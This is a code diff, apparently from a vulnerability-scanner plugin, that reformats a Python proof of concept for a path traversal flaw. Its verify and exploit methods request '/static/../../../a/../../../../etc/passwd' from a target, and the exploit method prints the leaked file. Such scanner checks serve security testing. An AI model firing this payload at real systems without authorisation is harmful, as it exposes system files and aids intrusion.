@@ -30,11 +30,12 @@ class Poc(ABPoc):
 
     def verify(self):
         try:
-            #根据payload的不同，输出数据也会不同，所以后期再根据系统定制化参数的功能对payload做通用性处理
+            # 根据payload的不同，输出数据也会不同，所以后期再根据系统定制化参数的功能对payload做通用性处理
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
             payload = '/static/../../../a/../../../../etc/passwd'
-            request = requests.get('{target}{params}'.format(target=self.target, params=payload))
+            request = requests.get('{target}{params}'.format(
+                target=self.target, params=payload))
             r = request.text
             if 'root:x:0:0:root:/root:/bin/bash' in r:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
@@ -45,11 +46,12 @@ class Poc(ABPoc):
 
     def exploit(self):
         try:
-            #这里是poc利用，这次是输出了/etc/passwd结果，后期可添加参数，用户将可以定制化自己提供的参数
+            # 这里是poc利用，这次是输出了/etc/passwd结果，后期可添加参数，用户将可以定制化自己提供的参数
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
             payload = '/static/../../../a/../../../../etc/passwd'
-            request = requests.get('{target}{params}'.format(target=self.target, params=payload))
+            request = requests.get('{target}{params}'.format(
+                target=self.target, params=payload))
             r = request.text
             if 'root:x:0:0:root:/root:/bin/bash' in r:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞，本次获取到目标数据是:\n{r}'.format(
@@ -57,6 +59,7 @@ class Poc(ABPoc):
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
+
 
 if __name__ == '__main__':
     Poc().run()
